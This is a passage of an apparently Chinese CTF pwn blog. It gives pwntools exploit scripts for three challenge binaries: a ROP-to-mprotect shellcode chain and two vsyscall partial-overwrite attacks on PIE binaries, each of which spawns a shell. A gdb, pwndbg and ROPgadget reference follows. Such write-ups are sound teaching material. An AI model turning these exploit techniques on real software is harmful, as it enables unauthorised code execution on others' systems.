class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#binary = &#x27;./shaokao&#x27;</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./shaokao&#x27;)</span></span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line">su = <span class="keyword">lambda</span> buf,addr:io.success(buf+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28568)</span></span><br><span class="line">io = process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1000000</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">read=<span class="number">0x457DC0</span><span class="comment">#elf.symbols[&#x27;read&#x27;]</span></span><br><span class="line">mprotect=<span class="number">0x458B00</span><span class="comment">#elf.symbols[&#x27;mprotect&#x27;]</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">ru(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">ru(<span class="string">&quot;请赐名：&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x4E8000</span>)<span class="comment">#第一个参数addr，0x4E8000是bss段上的一块空白区域</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0x1000</span>)<span class="comment">#第二个参数len</span></span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)<span class="comment">#第三个参数prot以及函数调用</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)<span class="comment">#read的第一个参数，0代表从用户输入的值中读取</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0x4E8000</span>)<span class="comment">#read的第二个参数，代表数据输入到的地址</span></span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)<span class="comment">#read的第三个参数输入大小和read函数调用</span></span><br><span class="line">payload+=p64(<span class="number">0x4E8000</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0x4E8000</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x4E8000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)+p64(<span class="number">0x4E8000</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sl(shellcode)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h1 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h1><p>gdb运行程序的时候会发现无论是否开启pie和aslr,内存<code>ffffffffff600000-ffffffffff601000</code>处一定是属于<code>vsyscall</code></p><p>将这块内存<code>dump memory ./dump ffffffffff600000 ffffffffff601000</code>dump下来查看,可以发现</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/13348817-23d78409dea3408f.webp" alt=""></p><p>内部是三个系统调用并跟随着retn</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>vsyscall的利用其实就是在程序地址随机化的情况下,通过在栈上寻找仅有部分比特位与我们需要的返回地址不同的地址信息,通过溢出部分写修改该地址,然后将vsyscall视为一个已知地址的gadget使返回地址一步步移动到所修改处</p><p>其实还是栈溢出的简单利用</p><p><strong>把vsyscall视为一个固定地址的ret-gadget</strong></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="magic-number"><a href="#magic-number" class="headerlink" title="magic_number"></a>magic_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0(a1, a2, a3);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">305419896</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为pie的存在,且程序简单没有输出几乎难以利用</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-25_172833.png" alt=""></p><p>观察栈上可以发现有与我们所需要的地址只差最后8比特位的地址</p><p>只要修改它并通过vsyscall返回到该处即可getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">b&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>非常有意思的一道题</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/1000levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>存在pie</p><p>程序有一个hint函数很关键,虽然我们无法使得show_int为非0,但是无论条件是否成立system的地址都会被保存到[rbp-0x110]处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( show_hint )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000CFB 48 8B 05 CE 12 20 00          mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D02 48 89 85 F0 FE FF FF          mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure><p>再看另一个关键的函数go</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( level(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hint和go在调用时栈的环境是相同的,因此二者的rbp-0x110也是相同的</p><p>那么也就是说在go函数中若输入v4不大于0,v4便不会被初始化而是上次保存的system地址</p><p>之后的<code>v5 = v4 + read_num();</code>允许我们修改system地址</p><p>不过单独的system并没有什么作用,也无法写入binsh字符串,故而我们可以利用system来找到one_gadget</p><p>最后利用vsyscall使one_gadget成为返回地址</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./1000levels&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span>  </span><br><span class="line">  </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">execv_gadget = <span class="number">0x4527a</span>  </span><br><span class="line">offset_addr = execv_gadget - system_addr  </span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many levels?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Any more?\n&#x27;</span>,<span class="built_in">str</span>(offset_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#level内部存在递归调用,当v5&gt;999时取1000次递归</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">999</span>):  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;Question: &#x27;</span>)  </span><br><span class="line">   a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;* &#x27;</span>)  </span><br><span class="line">   b = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;Answer:&#x27;</span>,<span class="built_in">str</span>(a*b))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall)*<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Answer:&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> DynELF </tag>
            
            <tag> mprotect </tag>
            
            <tag> vsyscall </tag>
            
            <tag> setcontext </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具使用手册</title>
      <link href="/posts/26682/"/>
      <url>/posts/26682/</url>
      
        <content type="html"><![CDATA[<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><ul><li><p>[]表示直接输入</p></li><li><p>“”表示需由引号包裹</p></li><li>{}表示键盘操作</li></ul><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul><li><p><code>help [指令]</code>查看个指令的用法</p></li><li><p><code>i</code>即info  查看信息</p><ul><li><code>i b</code>查看断点</li><li><code>i r</code>查看寄存器</li><li><code>i f</code>查看函数名</li></ul></li><li><code>show</code>与info类似,但更多是调试信息</li><li><code>stack [数]</code>查看栈</li><li><code>backtrace</code>查看当前调试环境中所有<strong>栈帧的信息</strong>,栈回溯.</li><li><code>vmmap</code>内存段基本信息</li><li><code>frame</code>查看当前frame(函数,栈帧)里的变量值等信息</li><li><code>display /[n]i $pc</code>查看当前往下n行代码</li></ul><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><ul><li><code>start</code>开始或重新开始</li><li><code>s [数]</code><strong>单步步入</strong>,会进入子函数,数有填的话就是执行多少步,<strong>源码层面</strong><ul><li><code>si [数]</code>同上,<strong>汇编层面</strong></li></ul></li><li><code>n [数]</code><strong>单步步过</strong>,不会进入子函数,数有填的话就是执行多少步,<strong>源码层面</strong><ul><li><code>ni [数]</code>同上,<strong>汇编层面</strong></li></ul></li><li><code>c</code>继续执行到断点，没断点就一直执行下去</li><li><code>&#123;ctrl+c&#125;</code>程序输入时强行中断</li><li><code>r</code>重新开始执行</li><li><code>finish(fi)</code>结束当前正在执行的函数，并在跳出函数后暂停程序的执行</li><li><code>return [值]</code>结束当前调用函数并返回指定值，到上一层函数调用处停止程序执行。</li><li><code>jump(j) [地址]</code>使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。即跳过部分代码</li><li><code>until(u)</code>单纯使用 until 命令，可以运行程序直到退出循环体。<ul><li><code>until n</code>命令中，n 为某一行代码的行号，该命令会使程序运行至第 n 行代码处停止。</li></ul></li></ul><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><ul><li><code>b *[地址]</code><ul><li><code>b *$ rebase([相对偏移])</code>开启pie时可用</li></ul></li><li><code>b [函数名]</code></li><li><code>b [数]</code>源码第几行断点</li><li><code>b +[数]</code>当前往下多少停住,同样可以有-</li><li><code>delete [数]</code>删除断点</li><li><code>disable [数]</code>禁用断点</li><li><code>enable [数]</code>启用断点</li><li><code>clear</code>清楚下面所有断点</li><li><code>watch [地址]</code>该地址数据改变时停下,例如<code>watch * (long long int*)0xdeadbeef</code>或者<code>watch &#123;long long int&#125;0xdeadbeef</code></li><li><code>watch [变量]</code>该变量改变的时候会断</li><li><code>info watchpoints</code> 查看watch断点信息</li><li><code>catch syscall</code> syscall系统调用的时候断住</li><li><code>tcatch syscall</code> syscall系统调用的时候断住，只断一次</li><li><code>info break</code> catch的断点可以通过i b查看</li></ul><h3 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h3><ol><li><code>search [值(多是字面值,字符串之类)]</code></li><li><code>find &quot;字符串&quot;</code>    pwndbg独有</li></ol><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><ul><li><p><code>x /[nuf]</code></p><ul><li><p>n代表几个单元</p></li><li><p>u代表每个单元几个字节(<strong>b—1</strong>|<strong>h—2</strong>|<strong>w—4</strong>|<strong>g—8</strong>)</p></li><li><p>f代表显示格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">s 按字符串显示。</span><br><span class="line">b 按字符显示。</span><br><span class="line">i 显示汇编指令</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>print(p) (&amp;)[符号]</code>打印符号的内容或查看符号的地址</p><ul><li><code>p (*(类型\*)内存地址)</code>,可以将某一块内存视为指定符号打印内容,例如<code>p (*(struct _IO_FILE_plus*)0x603180)</code></li></ul></li><li><p><code>telescope [内存|符号]</code>查看内容以更直观的方式</p></li><li><p><code>ptype</code>打印结构体定义例如<code>ptype struct _IO_wide_data</code></p></li><li><p><code>hexdump</code>像debug那样显示内存</p></li></ul><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><ul><li><code>set $[寄存器]=[值]</code> 把寄存器的值变为所更改的</li><li><code>set *([地址])=[值]</code> 地址的值更改，<strong>注意带星号</strong>,默认int位数,例如<code>set * (long long int*)0xdeadbeef=0x123456789</code></li><li><code>set &#123;数据类型&#125;([地址])=[值]</code>地址的值修改(<strong>指定位数</strong>).<strong>不用星号</strong>.例如<code>set &#123;long long int&#125;0xdeadbeef=0x123456789</code></li><li><code>set args &quot;a1&quot; &quot;a2&quot; &quot;a3&quot;</code> 给参数123赋值</li><li><code>set args &quot;python3 -c &#39;print &quot;1234\x7f\xde&quot;&#39;&quot;&#39;</code> 使用python给参数赋值不可见字符</li></ul><h3 id="堆-pwndbg-独有"><a href="#堆-pwndbg-独有" class="headerlink" title="堆(pwndbg)独有"></a>堆(pwndbg)独有</h3><ul><li><code>mp</code>查看mmap详细信息，包括<strong>临界信息</strong>等</li><li><p><code>top_chunk</code>显示topchunk信息</p></li><li><p><code>arena</code> 显示当前arena的详细信息</p><ul><li><code>arenas</code> 显示所有arena的基本信息</li><li><code>arenainfo</code> <strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> </p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> 单独查看fastbins的链表情况</li><li><code>largebins</code> 同上，单独查看largebins的链表情况</li><li><code>smallbins</code> 同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> 同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> 同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> 查看tcache详细信息</li></ul></li><li><p><code>heap</code> </p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> <strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> 显示堆得信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> 显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> <strong>好用</strong>，会跟提示所有操作堆的地方</p></li><li><p><code>malloc_chunk [chunk符号或地址]</code>查看该chunk的信息</p></li><li><p><code>find_fake_fast [地址] [大小]</code> 查找一块可以在给定地址附近伪造fake_fast_chunk的内存</p></li><li><p><code>vis</code>以数据块模式查看堆</p></li></ul><h3 id="其他-一些是pwndbg独有"><a href="#其他-一些是pwndbg独有" class="headerlink" title="其他(一些是pwndbg独有)"></a>其他(一些是pwndbg独有)</h3><ul><li><code>cyclic [数]</code> 生成用来溢出的字符<ul><li><code>cyclic -l [ 地址]</code>搭配使用</li></ul></li><li><code>$reabse</code> //<strong>开启PIE的情况的地址偏移</strong><ul><li><code>b *$reabse(0x123456)</code> 断住PIE状态下的二进制文件中0x123456的地方</li><li><code>codebase</code> 打印PIE偏移，<strong>与rebase不同，这是打印，rebase是使用</strong></li></ul></li><li><code>retaddr</code> 打印包含返回地址的栈地址</li><li><code>canary</code> 直接看canary的值</li><li><code>plt</code> 查看plt表</li><li><code>got</code> 查看got表</li><li><code>hexdump [地址] [数]</code> 像IDA那样显示数据，<strong>带字符串</strong></li></ul><h3 id="善用help-命令"><a href="#善用help-命令" class="headerlink" title="善用help [命令]"></a>善用help [命令]</h3><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>one_gadget是libc中存在的一些执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p><p>相比于<code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget &lt;FILE|-b BuildID&gt; [options]</span><br></pre></td></tr></table></figure><ol><li>如果是使用_malloc_hook来调用one_gadget，那么需要配合realloc来构造所需参数，realloc在libc中的符号是__libc_realloc</li><li>如果是使用其他方式调用one_gadget，比如说修改GOT表，那么需要在栈上提前构造好参数，或者将rax寄存器清零</li></ol><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><code>ROPgadget --binary filename --only &#39;pop|ret&#39;</code>搜索gadget</p><p><code>ROPgadget --binary filename --string &#39;/bin/sh&#39;</code>字符串</p><p>还有其他不少功能,详见help</p><h2 id="ropper"><a href="#ropper" class="headerlink" 